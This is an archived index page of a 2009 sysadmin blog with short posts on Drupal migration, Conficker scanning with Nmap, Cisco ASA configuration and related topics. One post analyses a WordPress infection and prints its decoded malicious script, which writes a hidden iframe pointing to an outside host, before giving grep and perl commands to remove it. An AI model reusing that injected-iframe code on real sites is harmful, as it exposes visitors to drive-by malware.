
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Linux Sysadmin Blog</title>
  <meta name="author" content="Promet OPS Team">

  
  <meta name="description" content="This post cover the steps to copy, transfer, or duplicate a Drupal site to new domain or from development/test site to live/production server. This &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://linuxsysadminblog.com/blog/page/13/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Linux Sysadmin Blog" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

<!-- Google Form for Contact Page -->
<!-- jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript">
    // Avoid conflict with ender.js.
jQuery.noConflict();
</script>
<!-- jQuery Form Plugin -->
<script src="http://malsup.github.com/jquery.form.js"></script>
<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js"></script> 
<script src="/javascripts/google_form.js"></script>
<!-- Google Form for Contact Page End here -->


  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-120251-38']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Linux Sysadmin Blog</a></h1>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:linuxsysadminblog.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/our-team">Our Team</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/blog/about">About</a></li>
  <li><a href="/blog/contact">Contact</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/04/drupal-howto-duplicate-copy-drupal-site/">Drupal HowTo: Duplicate / Copy Drupal Site</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/gerold-mercadero.html">Gerold Mercadero</a></span></span>

 - 








  


<time datetime="2009-04-03T04:48:11+08:00" pubdate data-updated="true">Apr 3<span>rd</span>, 2009</time>
        
         | <a href="/2009/04/drupal-howto-duplicate-copy-drupal-site/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This post cover the steps to copy, transfer, or duplicate a Drupal site to new domain or from development/test site to live/production server.  This requires shell/command line access to the server/accounts.  I attached (below) some bash/shell scripts below that i used to perform these task.</p>

<p><strong>Backup</strong>:  In case the destination site or account have existing contents, you need to backup them first or moved to separate location.</p>

<p><strong>Copy/Transfer Procedures</strong></p>

<p><strong>Database:</strong></p>

<p>1.) Create an sql dump of your source database (use mysqldump)
2.) Update references to domain/url and path or home directory (you can user perl/sed commands)
3.) Import to your destination database (using mysql).</p>

<p><strong>Files/Codes:</strong></p>

<p>1.)  Copy all files from your source directory or account to the destination site.
2.)  Update references to database name, database user, database password, home directory of drupal installation, and domain name or url.
3.)  Update permission and ownership of files and directories, like the sites/default/files to 777.</p>

<p><strong>Notes.</strong> If you have CiviCRM installed and on a separate database, then you can use this guide but do not perform or update the references to url and paths.  This guide is not applicable if you have CiviCRM installation which uses the same database as the Drupal database.  CiviCRM recommended install is to use a separate database.</p>

<p><strong>Shell / Bash Scripts:</strong></p>

<p>1.)  Copy Drupal Site with CiviCRM.  <a href="http://linuxsysadminblog.com/images/2009/04/copy_drupal_with_civicrm.sh"><strong>Download here!</strong></a></p>

<p>2.)  Copy Drupal Site without CiviCRM.  <a href="http://linuxsysadminblog.com/images/2009/04/copy_drupal_without_civicrm.sh"><strong>Download here!</strong></a></p>

<p><strong>Note:</strong> You can modify these scripts to work with sub-domains. Let me know if you have questions or suggestions or if you need help.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/04/big-brother-can-pull-the-plug/">Big Brother Can Pull the Plug</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/max-veprinsky.html">Max Veprinsky</a></span></span>

 - 








  


<time datetime="2009-04-02T03:21:09+08:00" pubdate data-updated="true">Apr 2<span>nd</span>, 2009</time>
        
         | <a href="/2009/04/big-brother-can-pull-the-plug/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>A <a href="http://regmedia.co.uk/2009/04/01/cybersecurity_bill.pdf">newly intorduced legislation</a> in the Untited States senate can give the US government the ability to limit and even shut down Internet traffic of public and private companies. In order to do this the president would first have to issue an order of &#8220;cybersecurity emergency&#8221; followed by the order of &#8220;limitation or shutdown of internet traffic to and from any compromised federal government or United States critical infrastructure information system or network&#8221;.</p>

<p>Another troubling part of this legislation could allow the goverment to &#8220;establish a broad set of cybersecurity standards that would be imposed on the government and the private sector, including companies that provide software, IT work or other services to networks that are deemed to be critical infrastructure&#8221;. Given the government&#8217;s <a href="http://www.google.com/search?q=us+government+hacking+2009&amp;hl=en&amp;client=firefox-a&amp;rls=org.mozilla:en-US:official&amp;hs=Xkx&amp;start=10&amp;sa=N">track record</a> of defending their own networks this may be  a step backwards considering the fifty or so incidents in 2009 alone.</p>

<p>And last but least the good &#8216;ol saying &#8220;it&#8217;s who you know that what you know&#8221; may ring louder then ever. Under this legislation it would also be <strong>illegal</strong> for employees or contractors providing &#8220;cybersecurity services to any federal agency or an information system or network designated by the president, or the president’s designee, as a critical infrastructure information system or network, who is not <strong>licensed and certified</strong> under the program.&#8221; Obviosly Tom Parker director of security services at <a href="http://www.securicon.com/index.shtml">Securicom</a> thinks the bill is a great idea considering the <a href="http://www.fedspending.org/fpds/fpds.php?parent_id=282455&amp;sortby=u&amp;detail=-1&amp;datype=T&amp;reptype=r&amp;database=fpds&amp;fiscal_year=&amp;submit=GO">$3.3 millions dollars in federal contract money</a> the company already accured.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/scanning-for-conficker-with-nmap/">Scanning for Conficker With Nmap</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/max-veprinsky.html">Max Veprinsky</a></span></span>

 - 








  


<time datetime="2009-03-31T00:31:23+08:00" pubdate data-updated="true">Mar 31<span>st</span>, 2009</time>
        
         | <a href="/2009/03/scanning-for-conficker-with-nmap/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>While <a href="https://www.honeynet.org/files/KYE-Conficker.pdf">Conficker</a> is not a new worm it has been getting much press lately. Even though <a href="http://www.microsoft.com">Redmond</a> released a <a href="http://www.microsoft.com/technet/security/Bulletin/MS08-067.mspx">patch</a> late October it is estimated that 5 to 10 million PC have been infected. The industry has been aware of this worm for some time and has mounted a fairly impressive counter attack. Microsoft issued a 250K dollar bounty for developers of Conficker, major anti-virus vendors have added definitions for detection and removal of the worm, OpenDNS introduces a feature that aid sysadmins in detecting infected machines and today with the help of <a href="http://honeynet.org">HoneyNet Project</a> security researches discovered Conficker&#8217;s fingerprint which makes it possible for tool such as Nmap, Nessus to detect the worm remotely.  This discovery come just in time as the latest variant of the worm &#8220;Conficker C&#8221; is programmed to lay dormant unlike the previous generations where identification of the worm was possible by monitoring outbound traffic.</p>

<p>Why just in time you may ask? Well because the worm is said to become active on April 1st. It is unknown if all infected PC will be used for bad deeds. I&#8217;m sure no one needs a reminder of the SQL Slammer worm of 2003/2004 where 5 of the 11 root DNS servers went down, ATM&#8217;s where knocked offline due to massive DDOS attacks. I understand the symbolism of April 1st being April fools day, but as the doctor always says: It&#8217;s far easier to prevent then to treat.</p>

<p>Using the <a href="http://download.insecure.org/nmap-dist/nmap-4.85BETA4-1.i386.rpm">latest development version of Nmap</a> one would run a command to scan systems for Conficker signature.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -PN -T4 -p139,445 -n -v --script=smb-check-vulns --script-args safe=1 [targetnetworks]</span></code></pre></td></tr></table></div></figure>


<p>Or by updating your <a href="http://www.nessus.org">Nessus</a> server&#8217;s plugins <code>nessus-update-plugins</code> create and run a scan that includes <a href="http://www.nessus.org/plugins/index.php?view=single&amp;id=36036">plugin id #36036</a> (if you don&#8217;t pay for Nessus Professional feed you will have to wait 7 days to receive the plugin)</p>

<p>Be mindful that Conficker can also spread via <a href="http://en.wikipedia.org/wiki/Sneakernet">sneakernet</a>, configuring your anti-virus client to scan all attached/removable extenal memory storage devices is always a great idea.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/rush-to-stake-a-claim-in-the-cloud/">Rush to Stake a Claim in the Cloud</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/andrew-kucharski.html">Andrew Kucharski</a></span></span>

 - 








  


<time datetime="2009-03-30T00:08:30+08:00" pubdate data-updated="true">Mar 30<span>th</span>, 2009</time>
        
         | <a href="/2009/03/rush-to-stake-a-claim-in-the-cloud/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Last week I was on a conference call with some potential client when one of the senior business people said: &#8220;And then we could use cloud computing or something, to get this application in the hands of everyone&#8221;.  </p>

<p>That&#8217;s when I thought - wow - this term really has penetrated into the mainstream.  Cloud Computing has crossed the chasm, except that it seems to be more of a catch phrase for the latest technical fad, except that no one seems to be talking about exactly the same thing.  </p>

<p>As if on cue the next morning the Wall Street Journal:  <a href="http://online.wsj.com/article/SB123802623665542725.html">The Internet Industry Is on a Cloud &#8211; Whatever That May Mean</a> by Geoffrey A. Fowler and Ben Worthen landed on my lap.  Ok, it landed on my porch, and then I read it.</p>

<p><img src="http://s.wsj.net/public/resources/images/HC-GN554_Questi_BV_20090325171834.gif" alt="" /></p>

<p>I hope the Journal doesnt mind if I borrow their image of the cloud - very fitting for the article.  Basically its a tale of marketers trying to - or should I say - fighting for integration of the term into its product jargon.  </p>

<p>Some of my favorite quotes from the piece are bleow.  I recommended the quick article as a nice distraction, but don&#8217;t expect to come away being clear on the term &#8220;Cloud Computing&#8221;.  </p>

<blockquote><p>&#8220;I have no idea what anyone is talking about,&#8221; said <a href="http://online.wsj.com/public/quotes/main.html?type=djn&amp;symbol=orcl">Oracle</a> Corp. Chief Executive Larry Ellison, when talking about cloud computing at a financial analyst conference in September. &#8220;It&#8217;s really just complete gibberish. What is it?&#8221; He added: &#8220;When is this idiocy going to stop?&#8221;</p></blockquote>

<p>In the full fiscal year since Salesforce started using the term cloud computing, its revenue grew 44%. &#8220;I think it&#8217;s the most powerful &#8220;>Buy Xenical cheap  term in the industry,&#8221; </p>

<p><a href="http://online.wsj.com/public/quotes/main.html?type=djn&amp;symbol=dell">Dell</a> Inc. applied to trademark the term cloud computing last year. The U.S. Patent and Trademark Office initially approved the application. But it changed its mind in response to an outburst of criticism, including from bloggers incensed that the term could fall under one company&#8217;s control.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/adding-custom-mantis-bug-status/">Adding Custom Mantis Bug Status</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/gerold-mercadero.html">Gerold Mercadero</a></span></span>

 - 








  


<time datetime="2009-03-24T03:15:52+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2009</time>
        
         | <a href="/2009/03/adding-custom-mantis-bug-status/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This post will guide you in adding new or custom ticket status on your Mantis bug tracker installation.  In our case we will refer the new status as GTG (GoodToGo).  Ticket will have this status if it is ready to push to production.
To do this we need to edit two files, <em>config_inc.php</em> and <em>custom_strings_inc.php</em> (create this file if not existing).</p>

<p><strong>Changes to config_inc.php:</strong></p>

<p>Find this line (bottom):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$g_status_enum_string = '10:new,20:feedback,30:acknowledged,40:confirmed,50:assigned,
</span><span class='line'>80:resolved,90:closed';</span></code></pre></td></tr></table></div></figure>


<p>and insert your new bug status together with its number.  You can assign the number depending on the level of status that you want.  Example my GTG status is higher than &#8220;resolved&#8221; but less than &#8220;closed&#8221; so i can assign 81 to 89.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$g_status_enum_string = '10:new,20:feedback,30:acknowledged,40:confirmed,50:assigned,
</span><span class='line'>80:resolved,85:GTG,90:closed';</span></code></pre></td></tr></table></div></figure>


<p>Assign a color for your bug status, example:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$g_status_colors['GTG'] = '#cceedd';</span></code></pre></td></tr></table></div></figure>


<p><strong>Changes to custom_strings_inc.php:</strong></p>

<p>Create definition for your new status:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$g_status_enum_string = '10:new,20:feedback,30:acknowledged,40:confirmed,50:assigned,
</span><span class='line'>80:resolved,85:GTG,90:closed';
</span><span class='line'>$s_GTG_bug_button = "GTG Issue";
</span><span class='line'>$s_GTG_bug_title = "Set Issue to GTG";
</span><span class='line'>$s_email_notification_title_for_status_bug_GTG = "The following issue is GTG.";</span></code></pre></td></tr></table></div></figure>


<p>That&#8217;s all and you should see your new status.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/remove-passphrase-from-private-key/">Remove Passphrase From Private Key</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/gerold-mercadero.html">Gerold Mercadero</a></span></span>

 - 








  


<time datetime="2009-03-23T01:56:12+08:00" pubdate data-updated="true">Mar 23<span>rd</span>, 2009</time>
        
         | <a href="/2009/03/remove-passphrase-from-private-key/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>We have several SSL to transfer to our new load-balancer (Nginx) and all of the private keys contain passphrase.  During Nginx (same with Apache) service restart it requires to enter the passphrase of all certificates, so we need to remove it.</p>

<p>This task is very simple, you only need to issue this command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/sbin/openssl rsa -in privkey_with_passphrase.key -out privkey_without_passphrase.key</span></code></pre></td></tr></table></div></figure>


<p><em>This will prompt you to enter the current passphrase</em>.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/heurtrojanscriptiframe/">HEUR:Trojan.Script.Iframe</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/gerold-mercadero.html">Gerold Mercadero</a></span></span>

 - 








  


<time datetime="2009-03-22T12:25:15+08:00" pubdate data-updated="true">Mar 22<span>nd</span>, 2009</time>
        
         | <a href="/2009/03/heurtrojanscriptiframe/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>One of my friend asked for help about virus appearing on his sites (mostly WordPress sites).  I checked it out and my Kaspersky Internet Security blocked the pages from loading, so i downloaded the files manually and scanned html with Kaspersky to determine affected files.</p>

<p><img src="http://linuxsysadminblog.com/images/2009/03/virus2-220x300.gif" alt="virus2" /></p>

<p>I noticed that the affected files were PHP and HTML only and if you compare the code of the original WordPress files with the infected one you will see the difference.  Below are sample added codes/virus:</p>

<p>HTML files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type="text/javascript"&gt;eval(String.fromCharCode(118,97...50,55))&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>PHP files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php echo '&lt;script type="text/javascript"&gt;eval(String.fromCharCode(118,97...50,55))&lt;/script&gt;'; ?&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>What it does</strong></p>

<p>I&#8217;m not a virus expert and I&#8217;m curios on what this portion of code does so i looked at it.  In our case the resulting text add this portion of code to the html or php files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var fggge3="si";
</span><span class='line'>var w345="pl";
</span><span class='line'>var re6="ank.";
</span><span class='line'>var rr="com";
</span><span class='line'>var a="if";
</span><span class='line'>var s="tt";
</span><span class='line'>document.write('&lt;'+a+'rame src="h'+s+'p://'+fggge3+''+w345+''+re6+''+rr+'/'+'qqp/'+''+''+'" style="d'+'isplay:n'+'one"&gt;');
</span><span class='line'>var t=00001217</span></code></pre></td></tr></table></div></figure>


<p>and you can see it tries to load an iframe:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;iframe src=http://siplank.com/qqp/ style=display:none&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>Virus Removal</strong></p>

<p>You can remove the virus by just deleting the code (sample above) on the affected files.  If you need to cleanup hundred of infected files (in our case more than 800) you can do the following:</p>

<ul>
<li>Get the list of infected files.  You can use grep to search for them</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -Z -R "eval(String.fromCharCode(118,97,114" /path/to/site/* &gt;&gt; affected_file_list.txt</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Delete the codes by using perl/sed commands.  Repeat the commands for every files.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl -pi -e 's/\&lt;script type="text\/javascript"\&gt;eval\(String.fromCharCode\(118,97,114...51,51\)\)\&lt;\/script\&gt;//'  /path/to/affected/file.htm
</span><span class='line'>perl -pi -e "s/\&lt;\?php echo ''; \?\&gt;\&lt;\?php echo ''; \?\&gt;//"  /path/to/affected/file.php</span></code></pre></td></tr></table></div></figure>


<p>Or create a bash/shell script to do the cleanup at once:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>while read line
</span><span class='line'>do
</span><span class='line'>perl -pi -e 's/\&lt;script type="text\/javascript"\&gt;eval\(String.fromCharCode\(118,97,114...51,51\)\)\&lt;\/script\&gt;//'  $line
</span><span class='line'>perl -pi -e "s/\&lt;\?php echo ''; \?\&gt;\&lt;\?php echo ''; \?\&gt;//"   $line
</span><span class='line'>done &lt; affected_file_list.txt</span></code></pre></td></tr></table></div></figure>


<p>That&#8217;s all.</p>

<p>I don&#8217;t know how the attacker gained access to the files and inserted the codes because the file permissions are ok - maybe they gain ftp access.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/asa-allow-passive-ftp-traffic/">ASA Allow Passive Ftp Traffic</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/max-veprinsky.html">Max Veprinsky</a></span></span>

 - 








  


<time datetime="2009-03-17T15:03:56+08:00" pubdate data-updated="true">Mar 17<span>th</span>, 2009</time>
        
         | <a href="/2009/03/asa-allow-passive-ftp-traffic/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Many ftp client will try to establish a <strong>passive</strong> connection with a server by default. A passive connection will use a high numbered unprivileged port range greater then 1023 (<strong>PASV</strong>) instead of port 20 (<strong>PORT</strong>). Most ftp servers specify different ranges that are to be used for passive connections.</p>

<p>When you are managing multiple ftp servers is it rather impractical to configure specific passive port ranges for each ftp server and open these ports in the firewall. A quick and much more practical solution is to use the stateful application inspection feature of the Adaptive Security Appliance.  To set-up inspection of the FTP protocol which will dynamically allow secondary ports to pass as well as allow NAT traversal of these ports we first must create an inspection policy for all interfaces which will inspect services on their standard ports:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>class-map global-class
</span><span class='line'>match default-inspection-traffic</span></code></pre></td></tr></table></div></figure>


<p>Next configure a policy map and inspection of the ftp protocol:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>policy-map global-policy
</span><span class='line'> class global-class
</span><span class='line'>  inspect ftp</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/ffmpeg-new-major-release/">Ffmpeg New Major Release</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/andrew-kucharski.html">Andrew Kucharski</a></span></span>

 - 








  


<time datetime="2009-03-10T17:20:11+08:00" pubdate data-updated="true">Mar 10<span>th</span>, 2009</time>
        
         | <a href="/2009/03/ffmpeg-new-major-release/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>FFMPEG announces a new release today.  It releases version 0.5</p>

<p>The slashodot peculated this<a href="http://tech.slashdot.org/article.pl?sid=09/03/10/144222&amp;from=rss"> ffmpeg related post</a> to the top of its news today:</p>

<blockquote><p><em>After many years of release-free development, FFmpeg, the most widely used audio and video codec library, has finally returned to a regular release schedule with the long-awaited version 0.5</em></p></blockquote>

<p>Here is a very abbreviated list of some of the improvements to the converter from the <a href="http://ffmpeg.org/">official ffmpeg</a> site:</p>

<blockquote><p>Significant work to support at least decoding of all widespread mainstream proprietary codecs, such as:</p>

<ul>
<li>decoders and encoders

<ul>
<li>ALAC</li>
<li>Flash Screen Video</li>
<li>WMAv2 decoder fixed, WMAv1/v2 encoder</li>
</ul>
</li>
<li>decoders</li>
<li>Atrac3</li>
<li>MLP/TrueHD</li>
<li>On2 VP3 improvements and VP5/VP6 support</li>
<li>RealAudio Cooker and fixes for 14.4 and 28.8</li>
<li>RealVideo RV30/40</li>
<li>WMV3/WMV9/VC-1 and IntraX8 frame support for WMV2/VC-1</li>
</ul>
</blockquote>

<p>We sysadmins at promet have used ffmpeg in several of our projects and find it a great tool.  Our recent implementations include a <a href="http://powerlearning21.com">video distance learning</a> tool and its also used in some of our work for sites of <a href="http://baird.house.gov.hillclips.tv/">members of the house of representatives</a> using this <a href="http://isupport.tv">video platform</a>.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2009/03/running-asdm-client-from-your-linux-desktop/">Running ASDM Client From Your Linux Desktop</a></h1>
    
    
      <p class="meta">
        
  


<span class="byline author vcard">Posted by <span class="fn"><a href="/blog/our-team/max-veprinsky.html">Max Veprinsky</a></span></span>

 - 








  


<time datetime="2009-03-10T16:13:30+08:00" pubdate data-updated="true">Mar 10<span>th</span>, 2009</time>
        
         | <a href="/2009/03/running-asdm-client-from-your-linux-desktop/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>For those of us who use Linux as a desktop replacement for Windows would find it nice to be able to run the ASDM client natively. If you haven&#8217;t upgraded your ASA/PIX to the <strong>latest ASDM</strong> you should do so. The steps are described <a href="http://linuxsysadminblog.com/2009/01/howto-upgrade-asdm-using-cli-on-cisco-asa5500/">here</a>.</p>

<p>Once you do upgrade your PIX/ASA to the latest version you may run into another issue where your bundled version of java not connect with ASDM. The remedy for this if you are using Fedora 10 can be <a href="http://linuxsysadminblog.com/2009/02/upgrade-to-java-se-6-update-12-on-fedora-10/">found here</a>.</p>

<p>Now assuming that you have asdm loaded and opened access to outside over port 4443 with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http server enable 4443
</span><span class='line'>http 0.0.0.0 0.0.0.0 outside</span></code></pre></td></tr></table></div></figure>


<p>You can connect to your PIX/ASA over port 4443 and download the asdm.jnlp file to your pc via web browser at https://external_ip_of_asa:4443</p>

<p>Once you posses the asdm.jnlp file issue <code>javaws asdm.jnlp</code> in terminal. Upon successful login this will create <code>.asdm</code> folder in your home directory with files inside, as well as a desktop shortcut. After this the <code>asdm.jnlp</code> is no longer needed and can be erased.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/14/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/12/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/2012/11/howto-bulk-import-dns-zones-to-softlayer-dns-using-cpanel/">HowTo: Bulk Import DNS Zones to Softlayer DNS using Cpanel</a>
      </li>
    
      <li class="post">
        <a href="/2012/08/integrate-sendgrid-with-redmine/">Integrate Sendgrid with Redmine</a>
      </li>
    
      <li class="post">
        <a href="/2012/07/rsback-task-x-is-locked-and-cannot-be-executed/">rsback: task x is locked and cannot be executed</a>
      </li>
    
      <li class="post">
        <a href="/2012/06/restore-xen-vm-from-lvm-snapshot-backups/">Restore Xen VM from LVM Snapshot Backups</a>
      </li>
    
      <li class="post">
        <a href="/2012/06/debian-6-backup-xen-with-lvm-and-rsnapshot/">Debian 6: Backup Xen with LVM and Rsnapshot</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/promet">@promet</a> on GitHub
  
  <script type="text/javascript">
    $.domReady(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'promet',
            count: 0,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  <script type="text/javascript">
    $.domReady(function(){
      getTwitterFeed("linuxsysadmnblg", 4, false);
    });
  </script>
  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
  
    <a href="http://twitter.com/linuxsysadmnblg" class="twitter-follow-button" data-show-count="false">Follow @linuxsysadmnblg</a>
  
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2012 - Promet OPS Team -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'linuxsysadminblog';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
